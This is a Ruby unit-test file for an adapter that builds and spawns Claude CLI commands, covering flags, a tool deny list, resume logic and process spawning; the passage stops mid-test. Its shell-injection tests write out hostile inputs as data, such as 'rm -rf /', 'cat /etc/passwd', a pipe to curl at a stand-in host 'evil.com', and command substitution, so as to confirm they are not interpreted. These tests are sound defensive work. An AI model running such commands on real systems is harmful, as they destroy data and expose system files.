# frozen_string_literal: true

require "test_helper"
require "minitest/mock"
require "timeout"

class ClaudeCliAdapterTest < ActiveSupport::TestCase
  setup do
    @adapter = ClaudeCliAdapter.new
    @test_dir = Dir.mktmpdir
    # Inject mock dependencies for testing
    @mock_process_manager = MockProcessManager.new
    @adapter.process_manager = @mock_process_manager
  end

  teardown do
    FileUtils.rm_rf(@test_dir) if @test_dir && File.exist?(@test_dir)
  end

  # ===== COMMAND BUILDING TESTS =====

  test "build_command creates basic claude CLI command" do
    command = @adapter.send(:build_command,
      prompt: "test prompt",
      session_id: "test-session-123",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    # "--" signals end of options so prompts starting with dashes work correctly
    expected = [
      "claude",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--session-id", "test-session-123",
      "--", "test prompt"
    ]
    assert_equal expected, command
  end

  test "build_command includes dangerously-skip-permissions flag when enabled" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: false)

    assert_includes command, "--dangerously-skip-permissions"
  end

  test "build_command excludes dangerously-skip-permissions flag when disabled" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_not_includes command, "--dangerously-skip-permissions"
  end

  test "build_command includes debug flag when enabled" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: true)

    assert_includes command, "--debug"
  end

  test "build_command excludes debug flag when disabled" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_not_includes command, "--debug"
  end

  test "build_command includes mcp-config flag when path provided" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: "/path/to/mcp.json",
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_includes command, "--mcp-config"
    assert_includes command, "/path/to/mcp.json"
  end

  test "build_command excludes mcp-config flag when path is nil" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_not_includes command, "--mcp-config"
  end

  test "build_command places prompt after -- to protect against prompts starting with dashes" do
    # Regression test for bug where prompts starting with dashes (e.g., "---- forked")
    # would be interpreted as unknown CLI options
    command = @adapter.send(:build_command,
      prompt: "How many twist channels do I have?",
      session_id: "session-1",
      mcp_config_path: "/path/to/mcp.json",
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: true)

    # Verify the prompt comes after "--" (end of options marker)
    double_dash_index = command.index("--")
    prompt_index = command.index("How many twist channels do I have?")

    assert_not_nil double_dash_index, "-- should be in command"
    assert_not_nil prompt_index, "Prompt should be in command"
    assert double_dash_index < prompt_index, "Prompt must come after -- to protect against prompts starting with dashes"

    # Verify the full expected command order
    expected = [
      "claude",
      "--dangerously-skip-permissions",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--debug",
      "--mcp-config",
      "/path/to/mcp.json",
      "--session-id",
      "session-1",
      "--",
      "How many twist channels do I have?"
    ]

    assert_equal expected, command
  end

  test "build_command includes session-id flag" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "unique-session-456",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_includes command, "--session-id"
    assert_includes command, "unique-session-456"
  end

  test "build_command places prompt after -- separator" do
    command = @adapter.send(:build_command,
      prompt: "create a new feature",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    # Prompt should come after "--" (end of options marker)
    prompt_index = command.index("create a new feature")
    double_dash_index = command.index("--")

    assert double_dash_index < prompt_index, "Prompt should come after -- separator"
  end

  test "build_command constructs full command with all flags" do
    command = @adapter.send(:build_command,
      prompt: "full test",
      session_id: "session-abc",
      mcp_config_path: "/mcp/config.json",
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: true)

    # "--" signals end of options so prompts starting with dashes work correctly
    expected = [
      "claude",
      "--dangerously-skip-permissions",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--debug",
      "--mcp-config",
      "/mcp/config.json",
      "--session-id",
      "session-abc",
      "--",
      "full test"
    ]

    assert_equal expected, command
  end

  test "build_command includes append-system-prompt when provided" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: "You are in Agent Orchestrator.",
      dangerously_skip_permissions: false,
      debug: false)

    assert_includes command, "--append-system-prompt"
    assert_includes command, "You are in Agent Orchestrator."
  end

  test "build_command excludes append-system-prompt when nil" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    refute_includes command, "--append-system-prompt"
  end

  test "build_command excludes append-system-prompt when blank" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: "   ",
      dangerously_skip_permissions: false,
      debug: false)

    refute_includes command, "--append-system-prompt"
  end

  test "build_command places append-system-prompt before prompt" do
    command = @adapter.send(:build_command,
      prompt: "test prompt",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: "custom context",
      dangerously_skip_permissions: true,
      debug: true)

    system_prompt_index = command.index("--append-system-prompt")
    prompt_index = command.index("test prompt")

    assert system_prompt_index < prompt_index, "--append-system-prompt should come before prompt"
  end

  # ===== MODEL SELECTION TESTS =====

  test "build_command includes --model flag when model is provided" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      model: "sonnet",
      dangerously_skip_permissions: true,
      debug: false)

    model_index = command.index("--model")
    assert model_index, "--model flag should be present"
    assert_equal "sonnet", command[model_index + 1]
  end

  test "build_command excludes --model flag when model is nil" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      model: nil,
      dangerously_skip_permissions: true,
      debug: false)

    refute_includes command, "--model"
  end

  test "build_resume_command includes --model flag when model is provided" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "continue",
      mcp_config_path: nil,
      append_system_prompt: nil,
      model: "opus",
      dangerously_skip_permissions: true,
      debug: false)

    model_index = command.index("--model")
    assert model_index, "--model flag should be present"
    assert_equal "opus", command[model_index + 1]
  end

  test "build_resume_command excludes --model flag when model is nil" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "continue",
      mcp_config_path: nil,
      append_system_prompt: nil,
      model: nil,
      dangerously_skip_permissions: true,
      debug: false)

    refute_includes command, "--model"
  end

  test "execute passes model to build_command" do
    @adapter.execute(
      prompt: "test",
      session_id: "session-1",
      working_dir: @test_dir,
      model: "sonnet"
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]
    model_index = command.index("--model")
    assert model_index, "--model flag should be present in spawned command"
    assert_equal "sonnet", command[model_index + 1]
  end

  test "resume passes model to build_resume_command" do
    @adapter.resume(
      session_id: "session-1",
      prompt: "continue",
      working_dir: @test_dir,
      model: "opus"
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]
    model_index = command.index("--model")
    assert model_index, "--model flag should be present in spawned command"
    assert_equal "opus", command[model_index + 1]
  end

  # ===== RESUME COMMAND BUILDING TESTS =====

  test "build_resume_command creates basic resume command" do
    command = @adapter.send(:build_resume_command,
      session_id: "resume-session-123",
      prompt: "continue working",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    # "--" signals end of options so prompts starting with dashes work correctly
    expected = [
      "claude",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--resume", "resume-session-123",
      "--", "continue working"
    ]
    assert_equal expected, command
  end

  test "build_resume_command includes dangerously-skip-permissions flag when enabled" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "test",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: false)

    assert_includes command, "--dangerously-skip-permissions"
  end

  test "build_resume_command includes debug flag when enabled" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "test",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: true)

    assert_includes command, "--debug"
  end

  test "build_resume_command uses --resume instead of --session-id" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-xyz",
      prompt: "test",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_includes command, "--resume"
    assert_includes command, "session-xyz"
    assert_not_includes command, "--session-id"
  end

  test "build_resume_command constructs full command with all flags" do
    command = @adapter.send(:build_resume_command,
      session_id: "resume-abc",
      prompt: "full resume test",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: true)

    # "--" signals end of options so prompts starting with dashes work correctly
    expected = [
      "claude",
      "--dangerously-skip-permissions",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--debug",
      "--resume",
      "resume-abc",
      "--",
      "full resume test"
    ]

    assert_equal expected, command
  end

  test "build_resume_command excludes prompt when nil (retry scenario)" do
    command = @adapter.send(:build_resume_command,
      session_id: "retry-session-123",
      prompt: nil,
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: true)

    expected = [
      "claude",
      "--dangerously-skip-permissions",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--debug",
      "--resume",
      "retry-session-123"
    ]

    assert_equal expected, command
    assert_not_includes command, nil
  end

  test "build_resume_command excludes prompt when empty string (retry scenario)" do
    command = @adapter.send(:build_resume_command,
      session_id: "retry-session-456",
      prompt: "",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: false)

    expected = [
      "claude",
      "--dangerously-skip-permissions",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--resume",
      "retry-session-456"
    ]

    assert_equal expected, command
    assert_not_includes command, ""
  end

  test "build_resume_command excludes prompt when whitespace only (retry scenario)" do
    command = @adapter.send(:build_resume_command,
      session_id: "retry-session-789",
      prompt: "   ",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    expected = [
      "claude",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--resume",
      "retry-session-789"
    ]

    assert_equal expected, command
  end

  test "build_resume_command includes append-system-prompt when provided" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "continue",
      mcp_config_path: nil,
      append_system_prompt: "Agent Orchestrator context",
      dangerously_skip_permissions: false,
      debug: false)

    assert_includes command, "--append-system-prompt"
    assert_includes command, "Agent Orchestrator context"
  end

  test "build_resume_command excludes append-system-prompt when nil" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "continue",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    refute_includes command, "--append-system-prompt"
  end

  test "build_resume_command includes --mcp-config when provided" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "continue",
      mcp_config_path: "/path/to/mcp.json",
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    mcp_index = command.index("--mcp-config")
    assert mcp_index, "--mcp-config flag should be present"
    assert_equal "/path/to/mcp.json", command[mcp_index + 1]
  end

  test "build_resume_command excludes --mcp-config when nil" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "continue",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    refute_includes command, "--mcp-config"
  end

  # ===== DISALLOWED TOOLS TESTS =====
  # AO sessions must never invoke Claude Code's in-process async-wait
  # primitives (Monitor, ScheduleWakeup, Bash(sleep *)), the bundled
  # `/schedule` skill (Skill(schedule)), or AskUserQuestion (interactive
  # prompts stall autonomous sessions) — see DISALLOWED_TOOLS.
  # --disallowedTools is the one enforcement knob that still applies under
  # --dangerously-skip-permissions, so every builder must inject it.

  def assert_disallowed_tools_flag(command)
    idx = command.index("--disallowedTools")
    assert idx, "--disallowedTools flag must be present in command: #{command.inspect}"
    expected_tools = [ "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion" ]
    assert_equal expected_tools, command[(idx + 1)..(idx + expected_tools.length)],
      "--disallowedTools must be followed by Monitor, ScheduleWakeup, Bash(sleep *), Skill(schedule), AskUserQuestion in order"
  end

  test "DISALLOWED_TOOLS constant lists the async-wait tools, /schedule skill, and AskUserQuestion" do
    assert_equal [ "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion" ], ClaudeCliAdapter::DISALLOWED_TOOLS
  end

  test "DISALLOWED_TOOLS includes AskUserQuestion to prevent interactive prompts" do
    # AskUserQuestion would surface a multiple-choice prompt and stall an
    # autonomous session waiting on interactive input. The system prompt
    # already directs agents toward autonomy; this is the enforcement.
    assert_includes ClaudeCliAdapter::DISALLOWED_TOOLS, "AskUserQuestion"
  end

  test "build_command always includes --disallowedTools even when dangerously_skip_permissions is false" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_disallowed_tools_flag(command)
  end

  test "build_command includes --disallowedTools when dangerously_skip_permissions is true" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: false)

    assert_disallowed_tools_flag(command)
  end

  test "build_resume_command always includes --disallowedTools even when dangerously_skip_permissions is false" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "continue",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_disallowed_tools_flag(command)
  end

  test "build_resume_command includes --disallowedTools when dangerously_skip_permissions is true" do
    command = @adapter.send(:build_resume_command,
      session_id: "session-1",
      prompt: "continue",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: false)

    assert_disallowed_tools_flag(command)
  end

  test "build_stream_json_command always includes --disallowedTools even when dangerously_skip_permissions is false" do
    command = @adapter.send(:build_stream_json_command,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_disallowed_tools_flag(command)
  end

  test "build_stream_json_command includes --disallowedTools when dangerously_skip_permissions is true" do
    command = @adapter.send(:build_stream_json_command,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: false)

    assert_disallowed_tools_flag(command)
  end

  test "build_stream_json_resume_command always includes --disallowedTools even when dangerously_skip_permissions is false" do
    command = @adapter.send(:build_stream_json_resume_command,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_disallowed_tools_flag(command)
  end

  test "build_stream_json_resume_command includes --disallowedTools when dangerously_skip_permissions is true" do
    command = @adapter.send(:build_stream_json_resume_command,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: true,
      debug: false)

    assert_disallowed_tools_flag(command)
  end

  test "--disallowedTools is followed by a -- flag so Commander variadic ends correctly" do
    # Commander.js variadic options (<tools...>) consume subsequent args until
    # the next token that starts with `--`. We rely on that to bound the list
    # to exactly our DISALLOWED_TOOLS entries. Verify every builder emits the
    # immediate next non-tool token as a `--...` flag — in both the
    # max-flags-on and min-flags-off shapes, since the risky boundary shifts
    # between them.

    max_flags = [
      @adapter.send(:build_command,
        prompt: "test", session_id: "s1", mcp_config_path: "/m.json",
        append_system_prompt: "sp", model: "claude-opus", dangerously_skip_permissions: true, debug: true),
      @adapter.send(:build_resume_command,
        session_id: "s1", prompt: "test", mcp_config_path: "/m.json",
        append_system_prompt: "sp", model: "claude-opus", dangerously_skip_permissions: true, debug: true),
      @adapter.send(:build_stream_json_command,
        session_id: "s1", mcp_config_path: "/m.json",
        append_system_prompt: "sp", model: "claude-opus", dangerously_skip_permissions: true, debug: true),
      @adapter.send(:build_stream_json_resume_command,
        session_id: "s1", mcp_config_path: "/m.json",
        append_system_prompt: "sp", model: "claude-opus", dangerously_skip_permissions: true, debug: true)
    ]

    min_flags = [
      @adapter.send(:build_command,
        prompt: "test", session_id: "s1", mcp_config_path: nil,
        append_system_prompt: nil, dangerously_skip_permissions: false, debug: false),
      @adapter.send(:build_resume_command,
        session_id: "s1", prompt: "test", mcp_config_path: nil,
        append_system_prompt: nil, dangerously_skip_permissions: false, debug: false),
      @adapter.send(:build_stream_json_command,
        session_id: "s1", mcp_config_path: nil,
        append_system_prompt: nil, dangerously_skip_permissions: false, debug: false),
      @adapter.send(:build_stream_json_resume_command,
        session_id: "s1", mcp_config_path: nil,
        append_system_prompt: nil, dangerously_skip_permissions: false, debug: false)
    ]

    (max_flags + min_flags).each do |cmd|
      idx = cmd.index("--disallowedTools")
      # After --disallowedTools and its tool args, the next token must start with "--"
      next_token = cmd[idx + 1 + ClaudeCliAdapter::DISALLOWED_TOOLS.length]
      assert next_token&.start_with?("--"),
        "Expected a --flag after --disallowedTools tool list, got #{next_token.inspect} in #{cmd.inspect}"
    end
  end

  # ===== SECURITY TESTS (SHELL INJECTION PREVENTION) =====

  test "build_command uses array syntax for safe command execution" do
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_kind_of Array, command, "Command must use array syntax to prevent shell injection"
  end

  test "build_command safely handles prompt with shell metacharacters" do
    dangerous_prompt = "test && rm -rf /"
    command = @adapter.send(:build_command,
      prompt: dangerous_prompt,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_kind_of Array, command
    assert_includes command, dangerous_prompt
    # Array syntax prevents shell interpretation
  end

  test "build_command safely handles prompt with semicolons" do
    dangerous_prompt = "test; cat /etc/passwd"
    command = @adapter.send(:build_command,
      prompt: dangerous_prompt,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_kind_of Array, command
    assert_includes command, dangerous_prompt
  end

  test "build_command safely handles prompt with pipes" do
    dangerous_prompt = "test | curl evil.com"
    command = @adapter.send(:build_command,
      prompt: dangerous_prompt,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_kind_of Array, command
    assert_includes command, dangerous_prompt
  end

  test "build_command safely handles prompt with command substitution" do
    dangerous_prompt = "test $(whoami)"
    command = @adapter.send(:build_command,
      prompt: dangerous_prompt,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_kind_of Array, command
    assert_includes command, dangerous_prompt
  end

  test "build_command safely handles prompt with backticks" do
    dangerous_prompt = "test `whoami`"
    command = @adapter.send(:build_command,
      prompt: dangerous_prompt,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_kind_of Array, command
    assert_includes command, dangerous_prompt
  end

  test "build_command safely handles session_id with special characters" do
    dangerous_session_id = "session-1; echo pwned"
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: dangerous_session_id,
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_kind_of Array, command
    session_id_index = command.index("--session-id")
    assert_equal dangerous_session_id, command[session_id_index + 1]
  end

  test "build_command safely handles mcp_config_path with special characters" do
    dangerous_path = "/path/to/config.json; rm -rf /"
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: dangerous_path,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_kind_of Array, command
    mcp_index = command.index("--mcp-config")
    assert_equal dangerous_path, command[mcp_index + 1]
  end

  # ===== SPAWN_PROCESS TESTS =====

  test "spawn_process creates stderr log file in working directory" do
    command = [ "claude", "test" ]

    result = @adapter.send(:spawn_process, command, working_dir: @test_dir)

    # MockProcessManager returns PIDs starting from 10000
    assert result[:pid] >= 10000, "Should return a PID from MockProcessManager"
    assert_equal File.join(@test_dir, "claude_stderr.log"), result[:stderr_log_path]

    # Verify process was spawned via MockProcessManager
    assert_equal 1, @mock_process_manager.spawned_processes.count
  end

  test "spawn_process sets working directory via chdir option" do
    command = [ "claude", "test" ]

    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    assert_equal @test_dir, spawned[:options][:chdir]
  end

  test "spawn_process sets pgroup option for process group management" do
    command = [ "claude", "test" ]

    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    assert_equal true, spawned[:options][:pgroup]
  end

  test "spawn_process redirects stderr to log file" do
    command = [ "claude", "test" ]

    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    assert spawned[:options][:err], "Should redirect stderr"
    assert_kind_of File, spawned[:options][:err]
  end

  test "spawn_process passes command as array arguments" do
    command = [ "claude", "--debug", "test prompt" ]

    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    assert_equal command, spawned[:command]
  end

  test "spawn_process returns hash with pid and stderr_log_path" do
    command = [ "claude", "test" ]

    result = @adapter.send(:spawn_process, command, working_dir: @test_dir)

    assert_kind_of Hash, result
    assert result[:pid] >= 10000, "Should return PID from MockProcessManager"
    assert_equal File.join(@test_dir, "claude_stderr.log"), result[:stderr_log_path]
  end

  test "spawn_process raises ClaudeCliError when Process.spawn fails" do
    command = [ "claude", "test" ]

    # Configure MockProcessManager to raise an error on spawn
    @mock_process_manager.spawn_hook = ->(*) { raise Errno::ENOENT, "claude command not found" }

    error = assert_raises(ClaudeCliAdapter::ClaudeCliError) do
      @adapter.send(:spawn_process, command, working_dir: @test_dir)
    end

    assert_match(/Failed to spawn Claude CLI/, error.message)
    assert_match(/claude command not found/, error.message)
  end

  test "spawn_process raises an actionable ClaudeCliError when working_dir is nil" do
    command = [ "claude", "test" ]

    error = assert_raises(ClaudeCliAdapter::ClaudeCliError) do
      @adapter.send(:spawn_process, command, working_dir: nil)
    end

    # Must NOT surface the cryptic "no implicit conversion of nil into String"
    refute_match(/no implicit conversion of nil into String/, error.message)
    assert_match(/working directory is missing/, error.message)
    assert_match(/started fresh/, error.message)
  end

  test "spawn_process raises an actionable ClaudeCliError when working_dir is blank" do
    command = [ "claude", "test" ]

    error = assert_raises(ClaudeCliAdapter::ClaudeCliError) do
      @adapter.send(:spawn_process, command, working_dir: "   ")
    end

    assert_match(/working directory is missing/, error.message)
  end

  test "spawn_process raises an actionable ClaudeCliError when command contains a nil arg" do
    command = [ "claude", "--session-id", nil ]

    error = assert_raises(ClaudeCliAdapter::ClaudeCliError) do
      @adapter.send(:spawn_process, command, working_dir: @test_dir)
    end

    refute_match(/no implicit conversion of nil into String/, error.message)
    assert_match(/nil argument/, error.message)
  end

  test "spawn_process_with_stdin raises an actionable ClaudeCliError when working_dir is nil" do
    command = [ "claude", "-p" ]

    error = assert_raises(ClaudeCliAdapter::ClaudeCliError) do
      @adapter.send(:spawn_process_with_stdin, command, working_dir: nil, stdin_content: "{}")
    end

    refute_match(/no implicit conversion of nil into String/, error.message)
    assert_match(/working directory is missing/, error.message)
  end

  test "spawn_process closes stderr file even on failure" do
    command = [ "claude", "test" ]
    mock_file = Object.new

    # Track if close is called
    def mock_file.close
      @closed = true
    end

    def mock_file.closed?
      @closed || false
    end

    File.stub :open, ->(*) { mock_file } do
      @mock_process_manager.spawn_hook = ->(*) { raise "spawn failed" }

      begin
        @adapter.send(:spawn_process, command, working_dir: @test_dir)
      rescue ClaudeCliAdapter::ClaudeCliError
        # Expected error
      end

      assert mock_file.closed?, "Should close stderr file on failure"
    end
  end

  # ===== EXECUTE METHOD TESTS =====

  test "execute builds command and spawns process" do
    result = @adapter.execute(
      prompt: "test task",
      session_id: "exec-session-1",
      working_dir: @test_dir,
      mcp_config_path: nil,
      dangerously_skip_permissions: true,
      debug: false
    )

    assert result[:pid] >= 10000, "Should return PID from MockProcessManager"

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]
    spawned_options = spawned[:options]

    assert_includes spawned_command, "claude"
    assert_includes spawned_command, "--dangerously-skip-permissions"
    assert_includes spawned_command, "--session-id"
    assert_includes spawned_command, "exec-session-1"
    assert_includes spawned_command, "test task"
    assert_equal @test_dir, spawned_options[:chdir]
  end

  test "execute passes through mcp_config_path to command builder" do
    @adapter.execute(
      prompt: "test",
      session_id: "session-1",
      working_dir: @test_dir,
      mcp_config_path: "/config/mcp.json",
      dangerously_skip_permissions: false,
      debug: false
    )

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]

    assert_includes spawned_command, "--mcp-config"
    assert_includes spawned_command, "/config/mcp.json"
  end

  test "execute passes through debug flag to command builder" do
    @adapter.execute(
      prompt: "test",
      session_id: "session-1",
      working_dir: @test_dir,
      dangerously_skip_permissions: false,
      debug: true
    )

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]

    assert_includes spawned_command, "--debug"
  end

  # ===== RESUME METHOD TESTS =====

  test "resume builds resume command and spawns process" do
    result = @adapter.resume(
      session_id: "resume-session-1",
      prompt: "continue task",
      working_dir: @test_dir,
      dangerously_skip_permissions: true,
      debug: false
    )

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]
    spawned_options = spawned[:options]

    assert_equal 10000, result[:pid]
    assert_includes spawned_command, "claude"
    assert_includes spawned_command, "--dangerously-skip-permissions"
    assert_includes spawned_command, "--resume"
    assert_includes spawned_command, "resume-session-1"
    assert_includes spawned_command, "continue task"
    assert_equal @test_dir, spawned_options[:chdir]
  end

  test "resume passes through debug flag to command builder" do
    @adapter.resume(
      session_id: "session-1",
      prompt: "test",
      working_dir: @test_dir,
      dangerously_skip_permissions: false,
      debug: true
    )

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]

    assert_includes spawned_command, "--debug"
  end

  # ===== EDGE CASES AND ERROR HANDLING =====

  test "build_command handles empty prompt" do
    command = @adapter.send(:build_command,
      prompt: "",
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_includes command, ""
    assert_kind_of Array, command
  end

  test "build_command handles prompt with newlines" do
    multiline_prompt = "line 1\nline 2\nline 3"
    command = @adapter.send(:build_command,
      prompt: multiline_prompt,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_includes command, multiline_prompt
  end

  test "build_command handles prompt with quotes" do
    quoted_prompt = 'test "quoted" and \'single\' quotes'
    command = @adapter.send(:build_command,
      prompt: quoted_prompt,
      session_id: "session-1",
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    assert_includes command, quoted_prompt
  end

  test "build_command handles session_id with special characters" do
    session_id = "session-123_ABC.xyz"
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: session_id,
      mcp_config_path: nil,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    session_id_index = command.index("--session-id")
    assert_equal session_id, command[session_id_index + 1]
  end

  test "build_command handles mcp_config_path with spaces" do
    path_with_spaces = "/path/with spaces/mcp config.json"
    command = @adapter.send(:build_command,
      prompt: "test",
      session_id: "session-1",
      mcp_config_path: path_with_spaces,
      append_system_prompt: nil,
      dangerously_skip_permissions: false,
      debug: false)

    mcp_index = command.index("--mcp-config")
    assert_equal path_with_spaces, command[mcp_index + 1]
  end

  # ===== LOGGING TESTS =====

  test "spawn_process logs command being executed" do
    command = [ "claude", "--debug", "test prompt" ]
    log_output = StringIO.new
    logger = Logger.new(log_output)
    mock_manager = MockProcessManager.new
    adapter = ClaudeCliAdapter.new(logger: logger)
    adapter.process_manager = mock_manager

    adapter.send(:spawn_process, command, working_dir: @test_dir)

    log_output.rewind
    log_content = log_output.read
    assert_match(/Spawning Claude CLI:/, log_content)
    assert_match(/claude --debug test prompt/, log_content)
  end

  # ===== INTEGRATION TESTS =====

  test "execute with all options creates correct command" do
    @adapter.execute(
      prompt: "complex task with 'quotes' and special chars $@",
      session_id: "session-xyz-123",
      working_dir: @test_dir,
